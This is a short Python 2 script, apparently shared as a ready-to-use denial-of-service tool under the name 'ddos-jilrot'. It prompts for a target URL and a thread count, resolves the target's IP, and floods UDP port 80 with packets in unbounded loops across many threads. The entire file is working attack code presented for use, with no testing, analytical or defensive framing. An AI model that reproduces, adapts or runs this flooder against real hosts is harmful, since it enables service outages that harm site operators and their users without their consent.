#!/usr/bin/python
#ddos-jilrot
#mehdi652 & mohamadg80
#https://jailbrrakandroot.tk
import time, socket, sys, thread, os
os.system("clear")
print'''
==============================================
      dd      dd
      dd      df           ssssssssss
      dd      dd           ssssssssss
  dddddf ddddddd dddddfdd  sss
  d   dd d    dd dd    dd  sssssssdds
  d   dd d    dd dd    dd         sss
  dddddd ddddffd dddddddd  ssssssssss

       code by mehdi652 & mohamadg80

        https://jailbreakandroot.tk
==============================================


'''
victim_addr = raw_input("Enter The URL :  ")
thread_count = input("Enter the counts of thread:  ")
victim_ip = socket.gethostbyname(victim_addr)

UDP_PORT = 80
MESSAGE = "DOS ATTACK!!!"
print "UDP target IP:", victim_ip
print "UDP target port:", UDP_PORT
time.sleep(3)

def dos(i):
    while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
            print "Packet Sent"

for i in xrange(thread_count):
    try:
     thread.start_new_thread( dos , ("Thread-"+str(i),) )
    except KeyboardInterrupt:
            sys.exit(0)
while 1:
  pass
